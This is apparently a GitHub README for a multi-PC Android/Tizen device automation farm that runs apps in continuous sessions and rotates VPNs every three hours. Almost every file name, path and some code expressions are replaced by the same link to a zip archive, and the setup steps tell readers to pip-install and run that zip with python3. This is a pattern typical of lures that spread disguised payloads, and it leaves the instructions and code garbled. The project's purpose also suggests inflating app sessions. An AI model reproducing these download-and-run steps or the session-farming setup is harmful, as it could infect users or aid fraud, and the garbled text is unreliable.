# Master Agent Mobile Automation

Manage and automate multiple Android/Tizen devices across multiple PCs from a single master controller.

## Features

- ✅ Control multiple PCs from one master PC
- 📱 List all devices or devices per PC
- 🎯 Run specific apps on specific devices/PCs
- 📊 Percentage-based app distribution (global & per-PC)
- 🔄 Automated VPN rotation every 3 hours
- 📈 Session tracking per device and app
- 📋 **Real-time log viewing** from master PC
- ⏹️ **Start/Stop control** for any device/PC
- 📊 **Session statistics** with detailed per-app breakdown
- 🎮 **Granular control** - run on all, specific PC, or single device

## Project Structure

```
MULTI_PC_DEVICE_MANAGER/
├── agents/
│   ├── scripts/
│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
│   │   ├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
│   │   └── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
│   └── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
├── master/
│   └── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
├── .env
├── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
├── Makefile
└── https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
```

## Setup

### 1. Install Dependencies

```bash
pip install -r https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
```

### 2. Configure Environment

Copy `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` to `.env` and update:

```bash
cp https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip .env
nano .env
```

**On Master PC (controller):**
- Set `PC1_HOST`, `PC2_HOST`, `PC3_HOST` to agent PC IPs
- Set unique tokens for each PC

**On Each Agent PC:**
- Set `AGENT_TOKEN` matching the master's token
- Set `AGENT_PORT` (default: 5000)

### 3. Start Agent Servers

**On each PC with connected devices:**

```bash
cd agents
python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
```

Or use systemd service for auto-start (recommended).

### 4. Configure App Distribution

Edit `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip`:

```python
# Global distribution (applies to all PCs unless overridden)
APP_DISTRIBUTION = {
    "nail_app": 40,      # 40% of devices
    "birthday_app": 35,  # 35% of devices
    "fitness_app": 25    # 25% of devices
}

# Per-PC distribution (optional)
PC_DISTRIBUTION = {
    "PC1": {"nail_app": 50, "birthday_app": 30, "fitness_app": 20},
    "PC2": {},  # Uses global distribution
    "PC3": {"nail_app": 60, "birthday_app": 40, "fitness_app": 0}
}
```

## Usage

### Using Makefile Commands (Easiest)

#### List Devices
```bash
# List all devices from all PCs
make list-all

# List devices from specific PC
make list PC=PC1
```

#### Run Automation
```bash
# Run on all devices (distributed apps)
make run-all

# Run specific app on all devices
make run-all APP=nail_app

# Run on specific PC
make run-pc PC=PC1
make run-pc PC=PC2 APP=birthday_app

# Run on specific device
make run-device PC=PC1 DEVICE=emulator-5554 APP=nail_app

# Shortcuts
make run-pc1                    # Run on PC1
make run-pc2 APP=nail_app       # Run nail_app on PC2
```

#### Stop Automation
```bash
# Stop all devices on all PCs
make stop-all

# Stop all devices on specific PC
make stop-pc PC=PC1
make stop-pc2                   # Shortcut

# Stop specific device
make stop-device PC=PC1 DEVICE=emulator-5554
```

#### View Logs
```bash
# View logs from all PCs
make logs-all
make logs-all LINES=200         # Last 200 lines

# View logs from specific PC
make logs-pc PC=PC1
make logs-pc1 LINES=100         # Shortcut with custom lines

# View logs from specific device
make logs-device PC=PC1 DEVICE=emulator-5554
make logs-device PC=PC1 DEVICE=emulator-5554 LINES=500
```

#### Session Statistics
```bash
# View sessions from all devices
make sessions-all

# View sessions from specific PC
make sessions-pc PC=PC1
make sessions-pc2               # Shortcut

# View sessions from specific device (detailed per-app stats)
make sessions-device PC=PC1 DEVICE=emulator-5554
```

#### Configuration
```bash
# Show distribution configuration
make distribution

# Start agent server (on agent PCs)
make agent
```

### Using Python Commands Directly

```bash
cd master

# List all devices
python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip list-all

# List devices from PC1
python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip list --pc PC1

# Run on all devices with distribution
python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip run-all

# Run specific app on all devices
python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip run-all --app nail_app

# Run on specific PC
python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip run-pc --pc PC1
python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip run-pc --pc PC2 --app birthday_app

# Show distribution
python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip distribution
```

## App Distribution Logic

### Global Distribution
When you run `make run-all`, devices are distributed based on `APP_DISTRIBUTION`:

Example with 10 total devices:
- nail_app: 40% = 4 devices
- birthday_app: 35% = 3 devices  
- fitness_app: 25% = 3 devices (rounded up)

### Per-PC Distribution
When you run `make run-pc1`, it uses `PC_DISTRIBUTION["PC1"]` if defined, otherwise falls back to global.

Example PC1 with 5 devices:
- nail_app: 50% = 3 devices
- birthday_app: 30% = 1 device
- fitness_app: 20% = 1 device

## Automation Flow

1. **Device Discovery**: Master queries all agent PCs for connected devices
2. **App Distribution**: Assigns apps to devices based on percentages
3. **Execution**: Sends run commands to each agent PC
4. **Agent Processing**: Each agent runs `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` with assigned app
5. **Session Loop**: 
   - Runs assigned app (or random if not specified)
   - Tracks sessions in `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip`
   - Changes VPN every 3 hours
   - Repeats continuously

## Session Tracking

All sessions are tracked in `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip`:

```json
[
  {
    "day": "Tuesday",
    "date": "07-10-2025",
    "devices": {
      "device123": {
        "completed_sessions": 15,
        "last_updated": "07-10-2025 14:30:25 IST",
        "apps": {
          "Nail App": {
            "completed_sessions": 8,
            "failed_sessions": 1,
            "last_updated": "07-10-2025 14:30:25 IST"
          },
          "Birthday App": {
            "completed_sessions": 6,
            "failed_sessions": 0,
            "last_updated": "07-10-2025 13:15:10 IST"
          }
        }
      }
    }
  }
]
```

## Port Management

Each device automatically gets unique ports:

```
Device 0: Appium 4723, System 8200, Chrome 9515
Device 1: Appium 4733, System 8210, Chrome 9525
Device 2: Appium 4743, System 8220, Chrome 9535
...
```

Configure base ports in `.env`:
```bash
BASE_APPIUM_PORT=4723
BASE_SYSTEM_PORT=8200
BASE_CHROME_PORT=9515
```

## Systemd Service (Auto-start Agents)

Create `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` on each agent PC:

```ini
[Unit]
Description=Device Automation Agent
https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip

[Service]
Type=simple
User=youruser
WorkingDirectory=/path/to/MULTI_PC_DEVICE_MANAGER/agents
Environment="PATH=/usr/bin:/usr/local/bin"
ExecStart=/usr/bin/python3 https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
Restart=always
RestartSec=10

[Install]
https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip
```

Enable and start:
```bash
sudo systemctl enable device-agent
sudo systemctl start device-agent
sudo systemctl status device-agent
```

## Troubleshooting

### Agent not responding
```bash
# Check if agent is running
curl http://localhost:5000/status

# Check logs
journalctl -u device-agent -f
```

### Devices not detected
```bash
# Check ADB/SDB
adb devices
sdb devices

# Restart ADB server
adb kill-server
adb start-server
```

### Port conflicts
Increase port spacing in `.env`:
```bash
BASE_APPIUM_PORT=4723
BASE_SYSTEM_PORT=8200
BASE_CHROME_PORT=9515
```

### Distribution not 100%
Edit percentages in `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` to total exactly 100:
```python
APP_DISTRIBUTION = {
    "nail_app": 40,
    "birthday_app": 35,
    "fitness_app": 25  # Total: 100
}
```

## Advanced Usage

### Run specific app on subset of devices

Modify `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` to add custom filtering:

```python
def run_on_devices(device_filter=None, app_name=None):
    all_devices, _ = list_all_devices()
    if device_filter:
        all_devices = [d for d in all_devices if device_filter(d)]
    # ... rest of logic
```

### Custom app weights per time of day

```python
import datetime

def get_distribution():
    hour = https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip().hour
    if 9 <= hour < 17:  # Daytime
        return {"nail_app": 50, "birthday_app": 30, "fitness_app": 20}
    else:  # Evening
        return {"nail_app": 30, "birthday_app": 50, "fitness_app": 20}
```

### Monitor all devices status

```bash
# Create monitoring script
watch -n 10 'make list-all'
```

## Quick Reference

| Command | Description |
|---------|-------------|
| `make list-all` | Show all devices |
| `make list PC=PC1` | Show PC1 devices |
| `make run-all` | Run with distribution |
| `make run-all APP=nail_app` | Run nail_app everywhere |
| `make run-pc1` | Run on PC1 only |
| `make run-pc2 APP=birthday_app` | Run birthday_app on PC2 |
| `make distribution` | Show config |
| `make agent` | Start agent server |

## API Endpoints

### Agent API

**GET /status**
- Returns: Connected devices
- Auth: Bearer token

**POST /run**
- Body: `{"device": "id", "type": "adb", "app": "nail_app"}`
- Returns: Execution status
- Auth: Bearer token

## Security Notes

- Change default tokens in `.env`
- Use firewall rules to restrict agent access
- Consider HTTPS for production (add nginx reverse proxy)
- Keep tokens in environment variables, never commit

## Contributing

1. Add new apps in `agents/scripts/`
2. Register in `https://github.com/PrathamTagline/master-agent-mobile-automation/raw/refs/heads/main/agents/scripts/mobile-master-automation-agent-v1.2-alpha.2.zip` GAMES dict
3. Update distribution percentages
4. Test with `make run-all APP=your_app`

## License

MIT